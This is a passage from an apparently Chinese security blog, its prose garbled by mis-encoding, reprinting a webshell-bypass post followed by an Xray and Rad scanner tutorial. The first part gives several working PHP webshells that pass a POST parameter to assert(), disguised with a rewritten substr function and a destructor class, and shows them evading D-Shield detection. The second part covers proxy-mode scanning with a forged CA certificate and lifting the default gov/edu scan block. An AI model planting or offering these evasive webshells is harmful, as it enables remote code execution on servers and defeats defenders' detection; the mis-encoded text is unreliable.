<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠŠå‡½æ•°æ›¿æ¢</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;assert(xyz@&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> =  <span class="title function_ invoke__">mysubstr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å†æ‹¿å»æ€</p>
<p><img src="/2024/01/19/Webshell-Bypass/11.png" alt="image"></p>
<p>ç»“è®ºå¾ˆæ¸…æ¥šäº†</p>
<p>å†æ¥Dç›¾æ€ä¸€ä¸‹</p>
<p><img src="/2024/01/19/Webshell-Bypass/12.png" alt="image"></p>
<p>ä¸é”™ æŠ¥2çº§äº† è¿™å°±æ˜¯æ²™ç›’å‹æŸ¥æ€å’Œæ­£åˆ™ç±»æŸ¥æ€çš„æ˜æ˜¾åŒºåˆ« æ€ä¹ˆè¿‡å‘¢ ç”¨æ„é€ æ–¹æ³•å³å¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/13.png" alt="image"></p>
<p>çœ‹åˆ°è¿™é‡Œå¤§å®¶å¯èƒ½ä¹Ÿå¾ˆå¥‡æ€ª è¿™é‡Œéƒ½æ²¡ç”¨åˆ°mysubstrå‡½æ•° æ”¾ä¸Šå»ä¸æ˜¯å¤šæ­¤ä¸€ä¸¾å—</p>
<p>ä¸å¥½æ„æ€ æ°æ°ä¸æ˜¯ æˆ‘ä»¬å¯ä»¥å»æ‰è¿™ä¸ªå‡½æ•° ç”¨Dç›¾æ€ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/14.png" alt="image"></p>
<p>æ€ä¹ˆæ · æ˜¯ä¸æ˜¯å¾ˆæœ‰è¶£</p>
<p>è¿™é‡Œæ”¾è¿™å †ä»£ç å¹¶ä¸æ˜¯ä¸ºäº†çœŸçš„ç”¨å®ƒ è€Œæ˜¯ä¸ºäº†è¿‡Dç›¾çš„ç‰¹å¾æŸ¥æ€ æ‰€ä»¥æ”¾ä»€ä¹ˆå‡½æ•°æ˜¯æ— æ‰€è°“çš„ã€‚</p>
<p>æ¯”å¦‚è¿™æ ·ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/15.png" alt="image"></p>
<p>è¿™é‡Œåªä»‹ç»äº†é‡å†™substrå‡½æ•° é‚£ä¹ˆå…¶ä»–çš„å‡½æ•°å¯ä»¥å— å½“ç„¶å¯ä»¥</p>
</blockquote>
<h3><span id="0x04å†™åœ¨åé¢">0x04ï¼šå†™åœ¨åé¢</span></h3><blockquote>
<p>åªè¦æ€æƒ³ä¸æ»‘å¡ æ–¹æ³•æ€»æ¯”å›°éš¾å¤š</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Webshell/" rel="tag">Webshell</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/Xray-Rad/">
                Xrayã€Radä¸¤æ¬¾å·¥å…·çš„ä½¿ç”¨ä¸è”åŠ¨
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="xray-radä¸¤æ¬¾å·¥å…·çš„ä½¿ç”¨ä¸è”åŠ¨">Xrayã€Radä¸¤æ¬¾å·¥å…·çš„ä½¿ç”¨ä¸è”åŠ¨</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1140037586/article/details/128316160">å¤åˆæ˜¥æœ«_æ˜Š</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h3><span id="1-xrayçš„ç®€ä»‹">1ã€Xrayçš„ç®€ä»‹</span></h3><blockquote>
<p><strong>xray æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å®‰å…¨è¯„ä¼°å·¥å…·ï¼Œç”±å¤šåç»éªŒä¸°å¯Œçš„ä¸€çº¿å®‰å…¨ä»ä¸šè€…å‘•å¿ƒæ‰“é€ è€Œæˆï¼Œä¸»è¦ç‰¹æ€§æœ‰:</strong></p>
<p>1ã€æ£€æµ‹é€Ÿåº¦å¿«ã€‚å‘åŒ…é€Ÿåº¦å¿«; æ¼æ´æ£€æµ‹ç®—æ³•æ•ˆç‡é«˜ã€‚<br>2ã€æ”¯æŒèŒƒå›´å¹¿ã€‚å¤§è‡³ OWASP Top 10 é€šç”¨æ¼æ´æ£€æµ‹ï¼Œå°è‡³å„ç§ CMS æ¡†æ¶ POCï¼Œå‡å¯ä»¥æ”¯æŒã€‚<br>3ã€ä»£ç è´¨é‡é«˜ã€‚ç¼–å†™ä»£ç çš„äººå‘˜ç´ è´¨é«˜, é€šè¿‡ Code Reviewã€å•å…ƒæµ‹è¯•ã€é›†æˆæµ‹è¯•ç­‰å¤šå±‚éªŒè¯æ¥æé«˜ä»£ç å¯é æ€§ã€‚<br>4ã€é«˜çº§å¯å®šåˆ¶ã€‚é€šè¿‡é…ç½®æ–‡ä»¶æš´éœ²äº†å¼•æ“çš„å„ç§å‚æ•°ï¼Œé€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶å¯ä»¥å®¢åˆ¶åŒ–åŠŸèƒ½ã€‚<br>5ã€å®‰å…¨æ— å¨èƒã€‚xray å®šä½ä¸ºä¸€æ¬¾å®‰å…¨è¾…åŠ©è¯„ä¼°å·¥å…·ï¼Œè€Œä¸æ˜¯æ”»å‡»å·¥å…·ï¼Œå†…ç½®çš„æ‰€æœ‰ payload å’Œ poc å‡ä¸ºæ— å®³åŒ–æ£€æŸ¥ã€‚<br>è¿™æ˜¯Xrayçš„å®˜æ–¹æ•™ç¨‹<a target="_blank" rel="noopener" href="https://docs.xray.cool/#/">https://docs.xray.cool/#/</a></p>
</blockquote>
<h3><span id="2-xrayçš„ä½¿ç”¨">2ã€Xrayçš„ä½¿ç”¨</span></h3><h4><span id="21-ä¸‹è½½xray">2.1ã€ä¸‹è½½Xray</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a></p>
</blockquote>
<h4><span id="22-ä½¿ç”¨powershellè¿›å…¥åˆ°ä¸‹è½½è§£å‹çš„ç›®å½•">2.2ã€ä½¿ç”¨powershellè¿›å…¥åˆ°ä¸‹è½½è§£å‹çš„ç›®å½•</span></h4><blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\Xray.exe --è¿è¡Œxray</span><br><span class="line">.\Xray.exe version  --æŸ¥çœ‹ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure>
</blockquote>
<h4><span id="23-ä½¿ç”¨-xray-ä»£ç†æ¨¡å¼è¿›è¡Œæ¼æ´æ‰«æ">2.3ã€ä½¿ç”¨ xray ä»£ç†æ¨¡å¼è¿›è¡Œæ¼æ´æ‰«æ</span></h4><blockquote>
<p>ï¼ˆ1ï¼‰ä»£ç†æ¨¡å¼ä¸‹ï¼Œæ‰«æå™¨ä½œä¸ºä¸­é—´äººï¼Œé¦–å…ˆåŸæ ·è½¬å‘æµé‡ï¼Œå¹¶è¿”å›æœåŠ¡å™¨å“åº”ç»™æµè§ˆå™¨ç­‰å®¢æˆ·ç«¯ï¼Œé€šè®¯ä¸¤ç«¯éƒ½è®¤ä¸ºè‡ªå·±ç›´æ¥ä¸å¯¹æ–¹å¯¹è¯ï¼ŒåŒæ—¶è®°å½•è¯¥æµé‡ï¼Œç„¶åä¿®æ”¹å‚æ•°å¹¶é‡æ–°å‘é€è¯·æ±‚è¿›è¡Œæ‰«æã€‚<br>ï¼ˆ2ï¼‰åœ¨æµè§ˆå™¨ä½¿ç”¨ https åè®®é€šä¿¡çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»è¦å¾—åˆ°å®¢æˆ·ç«¯çš„ä¿¡ä»»ï¼Œæ‰èƒ½å»ºç«‹ä¸å®¢æˆ·ç«¯çš„é€šä¿¡ã€‚è¿™é‡Œçš„çªç ´å£å°±æ˜¯ ca è¯ä¹¦ã€‚åªè¦è‡ªå®šä¹‰çš„ ca è¯ä¹¦å¾—åˆ°äº†å®¢æˆ·ç«¯çš„ä¿¡ä»»ï¼Œxray å°±èƒ½ç”¨è¯¥ ca è¯ä¹¦ç­¾å‘å„ç§ä¼ªé€ çš„æœåŠ¡å™¨è¯ä¹¦ï¼Œä»è€Œè·å–åˆ°é€šä¿¡å†…å®¹ã€‚</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_darwin_amd64 genca --ç”Ÿæˆcaè¯ä¹¦</span><br></pre></td></tr></table></figure>

<p>åŒå‡» ca.crtï¼Œå°†è¯ä¹¦å¯¼å…¥åˆ°å—ä¿¡ä»»çš„ç›®å½•</p>
<p><img src="/2024/01/19/Xray-Rad/1.png" alt="image"></p>
<p>ï¼ˆ3ï¼‰xray é…ç½®æ–‡ä»¶ä¸­é»˜è®¤ä¸å…è®¸æ‰«æ gov å’Œ edu ç­‰ç½‘ç«™ï¼Œå¦‚æœæƒ³å¯¹è¿™äº›ç½‘ç«™è¿›è¡Œæˆæƒæµ‹è¯•ï¼Œéœ€è¦ç§»é™¤ config.ymlä¸­çš„hostname_disallowed çš„ç›¸å…³é…ç½®ã€‚</p>
</blockquote>
<h4><span id="24-å¼€å§‹æ‰«æ">2.4ã€å¼€å§‹æ‰«æ</span></h4><blockquote>
<p>ä½¿ç”¨powershellæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./xray.exe webscan --listen <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7777</span> --html-output xray-scan.html  ---å¯åŠ¨ç›‘å¬</span><br><span class="line">./xray.exe webscan --url-file edu.txt --html-output edu.html</span><br></pre></td></tr></table></figure>

<p>ï¼ˆ1ï¼‰å¯åŠ¨ç›‘å¬ä¹‹åï¼Œæµè§ˆå™¨å¼€å¯127.0.0.1&#x2F;7777çš„ä»£ç†<br>ï¼ˆ2ï¼‰æµè§ˆå™¨è®¿é—®ç½‘é¡µå°±è¡Œï¼Œxrayä¼šè‡ªåŠ¨è¿›è¡Œæ‰«æ</p>
</blockquote>
<h4><span id="25-ä½¿ç”¨-xray-åŸºç¡€çˆ¬è™«æ¨¡å¼è¿›è¡Œæ¼æ´æ‰«æ">2.5ã€ä½¿ç”¨ xray åŸºç¡€çˆ¬è™«æ¨¡å¼è¿›è¡Œæ¼æ´æ‰«æ</span></h4><blockquote>
<p>ï¼ˆ1ï¼‰çˆ¬è™«æ¨¡å¼æ˜¯æ¨¡æ‹Ÿäººå·¥å»ç‚¹å‡»ç½‘é¡µçš„é“¾æ¥ï¼Œç„¶åå»åˆ†ææ‰«æï¼Œå’Œä»£ç†æ¨¡å¼ä¸åŒçš„æ˜¯ï¼Œçˆ¬è™«ä¸éœ€è¦äººå·¥çš„ä»‹å…¥ï¼Œè®¿é—®é€Ÿåº¦è¦å¿«å¾ˆå¤š<br>.&#x2F;xray.exe webscan â€“basic-crawler <a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/sqli/sqli_str.php">http://127.0.0.1/pikachu/vul/sqli/sqli_str.php</a> â€“html-output pachong_pikachu.html<br>ï¼ˆ2ï¼‰ç™»å½•åçš„ç½‘ç«™æ‰«æã€‚å¦‚æœç”¨çš„æ˜¯ä»£ç†æ¨¡å¼ï¼Œåªè¦æµè§ˆå™¨æ˜¯ç™»å½•çŠ¶æ€ï¼Œé‚£ä¹ˆæ¼æ´æ‰«ææ”¶åˆ°çš„è¯·æ±‚ä¹Ÿéƒ½æ˜¯ç™»å½•çŠ¶æ€çš„è¯·æ±‚ã€‚å¯¹äºæ™®é€šçˆ¬è™«è€Œè¨€ï¼Œå°±æ²¡æœ‰è¿™ä¹ˆâ€œè‡ªåŠ¨åŒ–â€äº†ï¼Œ å¯ä»¥é€šè¿‡é…ç½® Cookie çš„æ–¹å¼å®ç°ç™»å½•åçš„æ‰«æã€‚æ‰“å¼€é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ http é…ç½®éƒ¨åˆ†çš„ Headers é¡¹:ï¼ˆé…ç½®æ–‡ä»¶ä¿®æ”¹ï¼‰</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:</span><br><span class="line">  headers:</span><br><span class="line">    Cookie: key=value</span><br></pre></td></tr></table></figure>
</blockquote>
<h4><span id="26-æ¼æ´æ‰«ææ—¶ä½¿ç”¨ä»£ç†é…ç½®æ–‡ä»¶ä¿®æ”¹">2.6ã€æ¼æ´æ‰«ææ—¶ä½¿ç”¨ä»£ç†ï¼ˆé…ç½®æ–‡ä»¶ä¿®æ”¹ï¼‰</span></h4><blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy:&quot;	&quot;	# æ¼æ´æ‰«ææ—¶ä½¿ç”¨çš„ä»£ç†ï¼Œå¦‚: http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="3-radç®€ä»‹">3ã€Radç®€ä»‹</span></h3><blockquote>
<p>Radæ˜¯é•¿äº­ç§‘æŠ€å¼€å‘çš„ä¸€æ¬¾ç›®å½•çˆ¬å–å·¥å…·ï¼Œå› ä¸ºxrayè‡ªåŠ¨åŒ–çˆ¬å–åŠŸèƒ½æ¬ ä½³ï¼Œæ‰€ä»¥ç»“åˆradå¯ä»¥æ›´é«˜æ•ˆçš„è‡ªåŠ¨çˆ¬å–ã€‚æ³¨æ„ï¼Œradåªæ˜¯çˆ¬å–ç›®æ ‡çš„ç›®å½•ï¼Œä¸çˆ¬å–å­åŸŸï¼ï¼</p>
</blockquote>
<h4><span id="31-ä¸‹è½½rad">3.1ã€ä¸‹è½½Rad</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/chaitin/rad/releases">https://github.com/chaitin/rad/releases</a></p>
</blockquote>
<h4><span id="32-radçš„ä½¿ç”¨">3.2ã€Radçš„ä½¿ç”¨</span></h4><blockquote>
<p>ä¸‹è½½å¥½åè¿›å…¥è§£å‹çš„ç›®å½•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è¿›è¡Œä½¿ç”¨</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rad -t http://example.com</span><br><span class="line">éœ€è¦æ‰‹åŠ¨ç™»å½•çš„æƒ…å†µ</span><br><span class="line"></span><br><span class="line">rad -t http://example.com -wait-login</span><br><span class="line">æ‰§è¡Œä»¥ä¸Šå‘½ä»¤ä¼šè‡ªåŠ¨ç¦ç”¨æ— å¤´æµè§ˆæ¨¡å¼ï¼Œå¼€å¯ä¸€ä¸ªæµè§ˆå™¨ä¾›æ‰‹åŠ¨ç™»å½•ã€‚ åœ¨ç™»å½•å®Œæ¯•ååœ¨å‘½ä»¤è¡Œç•Œé¢ç‚¹å‡»å›è½¦é”®ç»§ç»­çˆ¬å–ã€‚</span><br><span class="line"></span><br><span class="line">rad -t http://example.com -text-output vuln.txt</span><br><span class="line">ä»¥ä¸Šå‘½ä»¤ä¼šå°†çˆ¬å–åˆ°çš„URLè¾“å‡ºåˆ°vuln.txtä¸­</span><br><span class="line"></span><br><span class="line">å¯¼å‡ºå®Œæ•´è¯·æ±‚</span><br><span class="line">rad -t http://example.com -full-text-output result.txt</span><br><span class="line"></span><br><span class="line">å®Œç¾ä½¿ç”¨è¯­æ³•å¦‚ä¸‹</span><br><span class="line">rad_windows_amd64.exe -t http://example.com -text-output vuln.txt  -wait-login</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="4-xrayä¸radè”åŠ¨">4ã€Xrayä¸Radè”åŠ¨</span></h3><h4><span id="41-radxrayé«˜æ•ˆæ‰«æ">4.1ã€rad+xrayé«˜æ•ˆæ‰«æ</span></h4><blockquote>
<p>ï¼ˆ1ï¼‰xrayå¼€å¯ä»£ç†ç›‘å¬</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray.exe  webscan --listen <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7777</span> --html-output proxy.html </span><br></pre></td></tr></table></figure>

<p>ï¼ˆ2ï¼‰radå¯¹ç›®æ ‡è¿›è¡Œçˆ¬å–ï¼Œä»£ç†åˆ°xrayä¸Š</p>
